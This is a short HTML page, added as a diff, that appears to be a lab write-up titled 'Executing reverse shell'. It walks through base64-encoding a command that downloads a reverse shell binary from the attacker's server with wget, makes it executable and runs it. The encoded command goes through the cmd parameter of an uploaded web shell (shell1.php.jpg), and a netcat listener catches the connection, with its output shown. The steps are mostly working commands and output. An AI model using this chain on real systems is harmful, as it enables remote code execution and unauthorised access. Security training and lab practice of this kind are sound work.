@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Executing reverse shell</title>
+</head><body>we used base64 encoded cmd for shell to avoid bad charter as base64 output contains only alphabet and numbers<br/>
+<b><span style="color: #000000"><br/>
+echo ‘wget http://192.168.104.4/shell; chmod +x shell; ./shell’ | base64<br/>
+<br/>
+</span></b><span style="color: #000000">above command uses wget to download the reverse tcp shell hosted from our server and makes it excutable. </span><br/>
+<br/>
+d2dldCBodHRwOi8vMTkyLjE2OC4xMDQuNC9zaGVsbDsgY2htb2QgK3ggc2hlbGw7IC4vc2hlbGwK<br/>
+<br/>
+input the above to cmd parameter in vulnerable web shell1.php.jpg<br/>
+<br/>
+note: create a netcat listener before this<br/>
+<br/>
+netcat -vlp 4444<br/>
+listening on [any] 4444 ...<br/>
+<br/>
+<br/>
+finally got reverse connection<br/>
+<br/>
+root@kali:~# netcat -vlp 4444<br/>
+listening on [any] 4444 ...<br/>
+192.168.104.5: inverse host lookup failed: Unknown host<br/>
+connect to [192.168.104.4] from (UNKNOWN) [192.168.104.5] 47009<br/>
+ls<br/>
+index.html<br/>
+shell<br/>
+shell1.php.jpg<br/>
+</body></html>
